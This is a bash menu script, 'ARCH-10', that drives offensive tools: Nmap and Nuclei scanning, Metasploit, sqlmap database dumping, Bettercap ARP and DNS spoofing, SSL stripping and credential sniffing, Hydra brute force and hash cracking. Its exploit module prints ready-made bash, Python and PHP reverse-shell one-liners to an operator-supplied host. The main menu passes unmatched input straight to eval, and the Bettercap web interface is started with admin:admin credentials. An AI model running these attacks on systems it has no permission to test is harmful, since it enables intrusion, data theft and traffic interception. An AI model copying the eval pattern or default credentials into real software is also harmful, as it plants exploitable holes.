#!/usr/bin/env bash
# ARCH-10 - Main Launcher

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/colors.sh"

show_banner() {
    clear
    cat "$SCRIPT_DIR/.banner.txt" 2>/dev/null
    echo ""
}

# ============================================
# MODULES
# ============================================

module_recon() {
    show_banner
    header "🔴 RECONNAISSANCE — Nuclei + Nmap" $R
    
    echo -e "  ${R}[${Y}1${R}]${N} ${G}Nuclei${N}     ${D}- Template-based vulnerability scanner${N}"
    echo -e "  ${R}[${Y}2${R}]${N} ${G}Nmap${N}       ${D}- Port scanner & service detection${N}"
    echo -e "  ${R}[${Y}3${R}]${N} ${G}Quick Scan${N} ${D}- Nuclei + Nmap combined${N}"
    echo -e "  ${R}[${Y}00${R}]${N} ${Y}Back${N}"
    echo ""
    
    read -p "$(echo -e ${R}"[${Y}RECON${R}]${N} > ")" ch
    
    case $ch in
        1|nuclei)
            read -p "$(echo -e ${Y}"[?] Target URL: "${N})" t
            [ -z "$t" ] && { error "Target required!"; return; }
            tool_banner "NUCLEI" "Recon" $R
            nuclei -u "$t" -severity low,medium,high,critical -o "$HOME/arch10/reports/nuclei_$(date +%Y%m%d).txt"
            success "Scan saved to reports/"
            ;;
        2|nmap)
            read -p "$(echo -e ${Y}"[?] Target: "${N})" t
            [ -z "$t" ] && { error "Target required!"; return; }
            tool_banner "NMAP" "Recon" $R
            nmap -sC -sV -O -A "$t" -oN "$HOME/arch10/reports/nmap_$(date +%Y%m%d).txt"
            success "Scan saved to reports/"
            ;;
        3|quick)
            read -p "$(echo -e ${Y}"[?] Target: "${N})" t
            [ -z "$t" ] && { error "Target required!"; return; }
            tool_banner "QUICK SCAN" "Recon" $R
            info "Running Nmap..."
            nmap -sC -sV -T4 "$t" -oN "$HOME/arch10/reports/nmap_quick.txt" 2>/dev/null
            info "Running Nuclei..."
            nuclei -u "http://$t" -severity medium,high,critical -o "$HOME/arch10/reports/nuclei_quick.txt" 2>/dev/null || \
            nuclei -u "https://$t" -severity medium,high,critical -o "$HOME/arch10/reports/nuclei_quick.txt" 2>/dev/null
            success "Quick scan complete! Check reports/"
            ;;
        00|0|back) return ;;
    esac
    echo ""; read -p "$(echo -e ${D}"Press Enter..."${N)"
    module_recon
}

module_exploit() {
    show_banner
    header "🟢 EXPLOIT — Metasploit" $G
    
    echo -e "  ${R}[${Y}1${R}]${N} ${G}msfconsole${N}  ${D}- Launch Metasploit Framework${N}"
    echo -e "  ${R}[${Y}2${R}]${N} ${G}Quick Shell${N}  ${D}- Generate reverse shell payload${N}"
    echo -e "  ${R}[${Y}3${R}]${N} ${G}Resource${N}     ${D}- Run resource script${N}"
    echo -e "  ${R}[${Y}00${R}]${N} ${Y}Back${N}"
    echo ""
    
    read -p "$(echo -e ${G}"[${Y}EXPLOIT${G}]${N} > ")" ch
    
    case $ch in
        1|msf)
            tool_banner "METASPLOIT" "Exploit" $G
            info "Starting Metasploit..."
            msfconsole -q
            ;;
        2|shell)
            read -p "$(echo -e ${Y}"[?] LHOST: "${N})" lhost
            read -p "$(echo -e ${Y}"[?] LPORT: "${N})" lport
            read -p "$(echo -e ${Y}"[?] Type (bash/python/php): "${N})" type
            [ -z "$lhost" ] && { error "LHOST required!"; return; }
            [ -z "$lport" ] && lport="4444"
            tool_banner "REVERSE SHELL" "Exploit" $G
            case $type in
                bash) echo -e "${G}bash -i >& /dev/tcp/${lhost}/${lport} 0>&1${N}" ;;
                python) echo -e "${G}python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${lhost}\",${lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'${N}" ;;
                php) echo -e "${G}php -r '\$sock=fsockopen(\"${lhost}\",${lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'${N}" ;;
                *) echo -e "${G}bash -i >& /dev/tcp/${lhost}/${lport} 0>&1${N}" ;;
            esac
            ;;
        3|resource)
            read -p "$(echo -e ${Y}"[?] Resource file path: "${N})" r
            [ -n "$r" ] && msfconsole -q -r "$r"
            ;;
        00|0|back) return ;;
    esac
    echo ""; read -p "$(echo -e ${D}"Press Enter..."${N)"
    module_exploit
}

module_sql() {
    show_banner
    header "⚪ SQL INJECTION — SQLMap" $G
    
    read -p "$(echo -e ${Y}"[?] Target URL (with parameter): "${N})" url
    [ -z "$url" ] && { error "URL required!"; return; }
    
    echo ""
    echo -e "  ${R}[${Y}1${R}]${N} ${G}Basic Scan${N}     ${D}- Test for SQL injection${N}"
    echo -e "  ${R}[${Y}2${R}]${N} ${G}Get Databases${N}  ${D}- Enumerate databases${N}"
    echo -e "  ${R}[${Y}3${R}]${N} ${G}Dump All${N}       ${D}- Dump entire database${N}"
    echo -e "  ${R}[${Y}4${R}]${N} ${G}Custom${N}         ${D}- Custom options${N}"
    echo -e "  ${R}[${Y}00${R}]${N} ${Y}Back${N}"
    echo ""
    
    read -p "$(echo -e ${G}"[${Y}SQL${G}]${N} > ")" ch
    
    tool_banner "SQLMAP" "SQL Injection" $G
    
    case $ch in
        1|basic)
            sqlmap -u "$url" --batch --random-agent --level=2 --risk=1 \
                --output-dir="$HOME/arch10/reports/sqlmap"
            ;;
        2|dbs)
            sqlmap -u "$url" --batch --random-agent --dbs \
                --output-dir="$HOME/arch10/reports/sqlmap"
            ;;
        3|dump)
            sqlmap -u "$url" --batch --random-agent --all \
                --output-dir="$HOME/arch10/reports/sqlmap"
            ;;
        4|custom)
            read -p "$(echo -e ${Y}"[?] Extra options: "${N})" opts
            sqlmap -u "$url" --batch --random-agent $opts \
                --output-dir="$HOME/arch10/reports/sqlmap"
            ;;
        00|0|back) return ;;
    esac
    echo ""; read -p "$(echo -e ${D}"Press Enter..."${N)"
    module_sql
}

module_mitm() {
    show_banner
    header "🟠 MITM — Bettercap" $C
    
    # Check root
    if [ "$EUID" -ne 0 ]; then
        warning "Bettercap requires root. Use sudo."
    fi
    
    echo -e "  ${R}[${Y}1${R}]${N} ${G}Full MITM${N}     ${D}- ARP spoof + sniff all traffic${N}"
    echo -e "  ${R}[${Y}2${R}]${N} ${G}DNS Spoof${N}     ${D}- Redirect DNS queries${N}"
    echo -e "  ${R}[${Y}3${R}]${N} ${G}SSL Strip${N}     ${D}- HTTPS → HTTP downgrade${N}"
    echo -e "  ${R}[${Y}4${R}]${N} ${G}Sniffer${N}       ${D}- Passive credential capture${N}"
    echo -e "  ${R}[${Y}5${R}]${N} ${G}Web UI${N}        ${D}- Start web interface${N}"
    echo -e "  ${R}[${Y}6${R}]${N} ${G}CLI${N}           ${D}- Interactive console${N}"
    echo -e "  ${R}[${Y}00${R}]${N} ${Y}Back${N}"
    echo ""
    
    read -p "$(echo -e ${C}"[${Y}MITM${C}]${N} > ")" ch
    
    case $ch in
        1|full)
            read -p "$(echo -e ${Y}"[?] Target IP: "${N})" t
            read -p "$(echo -e ${Y}"[?] Interface [eth0]: "${N})" i
            [ -z "$t" ] && { error "Target required!"; return; }
            [ -z "$i" ] && i="eth0"
            tool_banner "FULL MITM" "Bettercap" $C
            sudo bettercap -eval "set arp.spoof.targets $t; set arp.spoof.interface $i; arp.spoof on; net.sniff on"
            ;;
        2|dns)
            read -p "$(echo -e ${Y}"[?] Interface [eth0]: "${N})" i
            [ -z "$i" ] && i="eth0"
            tool_banner "DNS SPOOF" "Bettercap" $C
            sudo bettercap -eval "set arp.spoof.interface $i; set dns.spoof.all true; arp.spoof on; dns.spoof on"
            ;;
        3|sslstrip)
            read -p "$(echo -e ${Y}"[?] Interface [eth0]: "${N})" i
            [ -z "$i" ] && i="eth0"
            tool_banner "SSL STRIP" "Bettercap" $C
            sudo bettercap -eval "set arp.spoof.interface $i; set http.proxy.sslstrip true; http.proxy on; arp.spoof on"
            ;;
        4|sniff)
            read -p "$(echo -e ${Y}"[?] Interface [eth0]: "${N})" i
            [ -z "$i" ] && i="eth0"
            tool_banner "SNIFFER" "Bettercap" $C
            sudo bettercap -eval "set net.sniff.interface $i; set net.sniff.local true; net.sniff on"
            ;;
        5|webui)
            tool_banner "WEB UI" "Bettercap" $C
            info "Access at: http://127.0.0.1:80 (admin:admin)"
            sudo bettercap -eval "set api.rest.username admin; set api.rest.password admin; api.rest on; http-ui on"
            ;;
        6|cli)
            tool_banner "BETTERCAP CLI" "Bettercap" $C
            sudo bettercap
            ;;
        00|0|back) return ;;
    esac
    echo ""; read -p "$(echo -e ${D}"Press Enter..."${N)"
    module_mitm
}

module_web() {
    show_banner
    header "🔶 WEB APP — BurpSuite" $Y
    
    echo -e "  ${R}[${Y}1${R}]${N} ${G}Launch BurpSuite${N} ${D}- Start BurpSuite Community${N}"
    echo -e "  ${R}[${Y}2${R}]${N} ${G}Proxy Config${N}    ${D}- Show proxy setup guide${N}"
    echo -e "  ${R}[${Y}3${R}]${N} ${G}CA Cert${N}         ${D}- Install HTTPS certificate${N}"
    echo -e "  ${R}[${Y}4${R}]${N} ${G}Check Java${N}      ${D}- Verify Java version${N}"
    echo -e "  ${R}[${Y}00${R}]${N} ${Y}Back${N}"
    echo ""
    
    read -p "$(echo -e ${Y}"[${Y}WEB${Y}]${N} > ")" ch
    
    case $ch in
        1|launch)
            tool_banner "BURPSUITE" "Web App" $Y
            burpsuite &
            success "BurpSuite launched in background!"
            ;;
        2|proxy)
            tool_banner "PROXY SETUP" "Web App" $Y
            echo -e "${C}Firefox → Settings → Network → Connection Settings${N}"
            echo -e "${C}→ Manual proxy: 127.0.0.1:8080${N}"
            echo -e "${C}→ ✓ Also use for HTTPS${N}"
            echo ""
            echo -e "${C}Burp → Proxy → Proxy Settings → Add${N}"
            echo -e "${C}→ Bind: 127.0.0.1:8080${N}"
            echo -e "${C}→ ✓ Support invisible proxying${N}"
            ;;
        3|cert)
            tool_banner "CA CERTIFICATE" "Web App" $Y
            echo -e "${C}1. Proxy running → http://127.0.0.1:8080/${N}"
            echo -e "${C}2. Click 'CA Certificate' → save cacert.der${N}"
            echo -e "${C}3. Firefox → Settings → Certificates → Import${N}"
            echo -e "${C}4. ✓ Trust this CA to identify websites${N}"
            ;;
        4|java)
            tool_banner "JAVA CHECK" "Web App" $Y
            java -version 2>&1 | head -1
            echo ""
            archlinux-java status 2>/dev/null || echo "Run: archlinux-java status"
            ;;
        00|0|back) return ;;
    esac
    echo ""; read -p "$(echo -e ${D}"Press Enter..."${N)"
    module_web
}

module_password() {
    show_banner
    header "🟣 PASSWORD CRACKING — Hydra + Hashcat + John" $P
    
    echo -e "  ${R}[${Y}1${R}]${N} ${G}Hydra${N}        ${D}- Network brute-force${N}"
    echo -e "  ${R}[${Y}2${R}]${N} ${G}Hashcat${N}      ${D}- GPU password cracking${N}"
    echo -e "  ${R}[${Y}3${R}]${N} ${G}John${N}         ${D}- John the Ripper${N}"
    echo -e "  ${R}[${Y}4${R}]${N} ${G}Auto Crack${N}   ${D}- Auto-detect & crack hash${N}"
    echo -e "  ${R}[${Y}00${R}]${N} ${Y}Back${N}"
    echo ""
    
    read -p "$(echo -e ${P}"[${Y}PASSWORD${P}]${N} > ")" ch
    
    WORDLIST="$HOME/arch10/wordlists/rockyou.txt"
    [ ! -f "$WORDLIST" ] && WORDLIST="/usr/share/wordlists/rockyou.txt"
    
    case $ch in
        1|hydra)
            read -p "$(echo -e ${Y}"[?] Service (ssh/ftp/http-post-form): "${N})" svc
            read -p "$(echo -e ${Y}"[?] Target: "${N})" t
            read -p "$(echo -e ${Y}"[?] Username: "${N})" u
            [ -z "$t" ] && { error "Target required!"; return; }
            [ -z "$u" ] && u="root"
            tool_banner "HYDRA" "Password" $P
            hydra -l "$u" -P "$WORDLIST" "$svc://$t" -t 4 -V
            ;;
        2|hashcat)
            read -p "$(echo -e ${Y}"[?] Hash file: "${N})" h
            read -p "$(echo -e ${Y}"[?] Mode (0=MD5, 1000=NTLM, 1400=SHA256): "${N})" m
            [ -z "$h" ] && { error "Hash file required!"; return; }
            [ -z "$m" ] && m="0"
            tool_banner "HASHCAT" "Password" $P
            hashcat -m "$m" "$h" "$WORDLIST" --force -O
            echo ""
            hashcat -m "$m" "$h" --show
            ;;
        3|john)
            read -p "$(echo -e ${Y}"[?] Hash file: "${N})" h
            [ -z "$h" ] && { error "Hash file required!"; return; }
            tool_banner "JOHN THE RIPPER" "Password" $P
            john "$h" --wordlist="$WORDLIST"
            echo ""
            john --show "$h"
            ;;
        4|auto)
            read -p "$(echo -e ${Y}"[?] Hash file: "${N})" h
            [ -z "$h" ] && { error "Hash file required!"; return; }
            tool_banner "AUTO CRACK" "Password" $P
            info "Trying Hashcat first..."
            for mode in 0 1000 1400 100 1800 3200; do
                echo -e "${D}  Trying mode $mode...${N}"
                hashcat -m "$mode" "$h" "$WORDLIST" --force -O 2>/dev/null && {
                    success "Cracked with mode $mode!"
                    hashcat -m "$mode" "$h" --show
                    break
                }
            done
            info "Trying John..."
            john "$h" --wordlist="$WORDLIST" 2>/dev/null
            john --show "$h" 2>/dev/null
            ;;
        00|0|back) return ;;
    esac
    echo ""; read -p "$(echo -e ${D}"Press Enter..."${N)"
    module_password
}

module_enum() {
    show_banner
    header "🔵 ENUMERATION — Enum4linux" $B
    
    read -p "$(echo -e ${Y}"[?] Target IP: "${N})" t
    [ -z "$t" ] && { error "Target required!"; return; }
    
    echo ""
    echo -e "  ${R}[${Y}1${R}]${N} ${G}Full Enum${N}     ${D}- All enumeration checks${N}"
    echo -e "  ${R}[${Y}2${R}]${N} ${G}Users Only${N}    ${D}- Enumerate users${N}"
    echo -e "  ${R}[${Y}3${R}]${N} ${G}Shares${N}        ${D}- List SMB shares${N}"
    echo -e "  ${R}[${Y}4${R}]${N} ${G}SMB Client${N}    ${D}- Connect to SMB share${N}"
    echo -e "  ${R}[${Y}00${R}]${N} ${Y}Back${N}"
    echo ""
    
    read -p "$(echo -e ${B}"[${Y}ENUM${B}]${N} > ")" ch
    
    case $ch in
        1|full)
            tool_banner "ENUM4LINUX FULL" "Enumeration" $B
            enum4linux -a "$t" 2>/dev/null | tee "$HOME/arch10/reports/enum4linux_$(date +%Y%m%d).txt"
            ;;
        2|users)
            tool_banner "ENUM4LINUX USERS" "Enumeration" $B
            enum4linux -U "$t" 2>/dev/null
            ;;
        3|shares)
            tool_banner "SMB SHARES" "Enumeration" $B
            smbclient -L "//$t" -N 2>/dev/null
            ;;
        4|smb)
            read -p "$(echo -e ${Y}"[?] Share name: "${N})" s
            [ -n "$s" ] && smbclient "//$t/$s" -N
            ;;
        00|0|back) return ;;
    esac
    echo ""; read -p "$(echo -e ${D}"Press Enter..."${N)"
    module_enum
}

auto_scan() {
    local target="$1"
    [ -z "$target" ] && read -p "$(echo -e ${Y}"[?] Target: "${N})" target
    [ -z "$target" ] && { error "Target required!"; return; }
    
    local report="$HOME/arch10/reports/auto_scan_${target}_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$report"
    
    show_banner
    header "⚡ AUTO SCAN: ${target}" $R
    
    echo -e "${R}[${Y}1/4${R}]${N} ${G}Nmap${N} - Port scan..."
    nmap -sC -sV -T4 "$target" -oN "$report/nmap.txt" 2>/dev/null
    echo -e "  ${G}✓${N}"
    
    echo -e "${R}[${Y}2/4${R}]${N} ${G}Nuclei${N} - Vulnerability scan..."
    nuclei -u "http://$target" -severity medium,high,critical -o "$report/nuclei.txt" 2>/dev/null || \
    nuclei -u "https://$target" -severity medium,high,critical -o "$report/nuclei.txt" 2>/dev/null
    echo -e "  ${G}✓${N}"
    
    echo -e "${R}[${Y}3/4${R}]${N} ${B}Enum4linux${N} - SMB enumeration..."
    enum4linux -a "$target" > "$report/enum4linux.txt" 2>/dev/null
    echo -e "  ${G}✓${N}"
    
    echo -e "${R}[${Y}4/4${R}]${N} ${G}WhatWeb${N} - Technology detection..."
    whatweb "$target" > "$report/whatweb.txt" 2>/dev/null
    echo -e "  ${G}✓${N}"
    
    echo ""
    echo -e "${G}╔══════════════════════════════════════════════════════════╗${N}"
    echo -e "${G}║${N}              ${Y}⚡ AUTO SCAN COMPLETE ⚡${N}              ${G}║${N}"
    echo -e "${G}╚══════════════════════════════════════════════════════════╝${N}"
    echo -e "  ${C}Target:${N}  ${Y}${target}${N}"
    echo -e "  ${C}Reports:${N} ${G}${report}/${N}"
    echo ""
    ls -la "$report/"
}

module_reports() {
    show_banner
    header "📊 REPORTS" $C
    
    local report_dir="$HOME/arch10/reports"
    mkdir -p "$report_dir"
    
    echo -e "  ${R}[${Y}1${R}]${N} ${G}List Reports${N}  ${D}- Show all saved reports${N}"
    echo -e "  ${R}[${Y}2${R}]${N} ${G}View${N}          ${D}- View a report file${N}"
    echo -e "  ${R}[${Y}3${R}]${N} ${G}Clean${N}         ${D}- Delete old reports${N}"
    echo -e "  ${R}[${Y}00${R}]${N} ${Y}Back${N}"
    echo ""
    
    read -p "$(echo -e ${C}"[${Y}REPORTS${C}]${N} > ")" ch
    
    case $ch in
        1|list)
            echo -e "${C}Reports in ${G}${report_dir}${N}:"
            echo ""
            find "$report_dir" -type f 2>/dev/null | while read f; do
                size=$(du -h "$f" 2>/dev/null | cut -f1)
                echo -e "  ${Y}[${size}]${N} ${G}$(basename $f)${N}"
            done
            ;;
        2|view)
            echo -e "${C}Select report:${N}"
            select f in "$report_dir"/*; do
                [ -f "$f" ] && head -30 "$f"
                break
            done
            ;;
        3|clean)
            confirm "Delete all reports?" && {
                rm -rf "$report_dir"/*
                success "Reports cleaned!"
            }
            ;;
        00|0|back) return ;;
    esac
    echo ""; read -p "$(echo -e ${D}"Press Enter..."${N)"
    module_reports
}

# ============================================
# MAIN MENU
# ============================================
main_menu() {
    show_banner
    
    echo -e "${R}╔══════════════════════════════════════════════════════════╗${N}"
    echo -e "${R}║${N}              ${Y}${BD}⚡ ARCH-10 MAIN MENU ⚡${N}               ${R}║${N}"
    echo -e "${R}╚══════════════════════════════════════════════════════════╝${N}"
    echo ""
    echo -e "  ${R}[${Y}1${R}]${N} ${R}${BD}RECON${N}       ${D}— Nuclei + Nmap${N}"
    echo -e "  ${R}[${Y}2${R}]${N} ${G}${BD}EXPLOIT${N}     ${D}— Metasploit Framework${N}"
    echo -e "  ${R}[${Y}3${R}]${N} ${G}${BD}SQL INJECT${N}  ${D}— SQLMap Automation${N}"
    echo -e "  ${R}[${Y}4${R}]${N} ${C}${BD}MITM${N}        ${D}— Bettercap Framework${N}"
    echo -e "  ${R}[${Y}5${R}]${N} ${Y}${BD}WEB APP${N}     ${D}— BurpSuite Suite${N}"
    echo -e "  ${R}[${Y}6${R}]${N} ${P}${BD}PASSWORD${N}    ${D}— Hydra + Hashcat + John${N}"
    echo -e "  ${R}[${Y}7${R}]${N} ${B}${BD}ENUMERATION${N} ${D}— Enum4linux + SMB${N}"
    echo -e "  ${R}[${Y}8${R}]${N} ${R}${BD}AUTO SCAN${N}   ${D}— Full automated scan${N}"
    echo -e "  ${R}[${Y}9${R}]${N} ${C}${BD}REPORTS${N}     ${D}— View scan results${N}"
    echo -e "  ${R}[${Y}0${R}]${N} ${R}${BD}EXIT${N}        ${D}— Exit ARCH-10${N}"
    echo ""
    read -p "$(echo -e ${R}"[${Y}ARCH-10${R}]${N} > ")" choice
    
    case $choice in
        1|recon)       module_recon ;;
        2|exploit)     module_exploit ;;
        3|sql)         module_sql ;;
        4|mitm)        module_mitm ;;
        5|web)         module_web ;;
        6|password)    module_password ;;
        7|enum)        module_enum ;;
        8|scan)        auto_scan ;;
        9|reports)     module_reports ;;
        0|exit|quit)   
            echo -e "\n${R}☠ Exiting ARCH-10. Stay sharp.${N}"
            exit 0
            ;;
        *)
            [ -n "$choice" ] && eval "$choice" 2>/dev/null || warning "Invalid option"
            ;;
    esac
    
    [ "$choice" != "0" ] && [ "$choice" != "exit" ] && [ "$choice" != "quit" ] && {
        echo ""
        read -p "$(echo -e ${D}"Press Enter to return..."${N)"
        main_menu
    }
}

# ============================================
# ENTRY POINT
# ============================================
case "${1,,}" in
    recon|1)       module_recon ;;
    exploit|2)     module_exploit ;;
    sql|3)         module_sql ;;
    mitm|4)        module_mitm ;;
    web|5)         module_web ;;
    password|6)    module_password ;;
    enum|7)        module_enum ;;
    scan|8)        auto_scan "$2" ;;
    reports|9)     module_reports ;;
    --help|-h)
        echo "ARCH-10 v1.0 — 10 Tools Gacor untuk ArchLinux"
        echo ""
        echo "Usage: arch10 [module] [target]"
        echo ""
        echo "Modules:"
        echo "  recon          - Nuclei + Nmap"
        echo "  exploit        - Metasploit"
        echo "  sql            - SQLMap"
        echo "  mitm           - Bettercap"
        echo "  web            - BurpSuite"
        echo "  password       - Hydra + Hashcat + John"
        echo "  enum           - Enum4linux"
        echo "  scan <target>  - Auto scan"
        echo "  reports        - View reports"
        echo ""
        echo "Examples:"
        echo "  arch10                    - Interactive menu"
        echo "  arch10 recon              - Open recon"
        echo "  arch10 scan 192.168.1.1   - Auto scan"
        echo "  arch10 mitm               - MITM tools"
        ;;
    *)
        main_menu
        ;;
esac
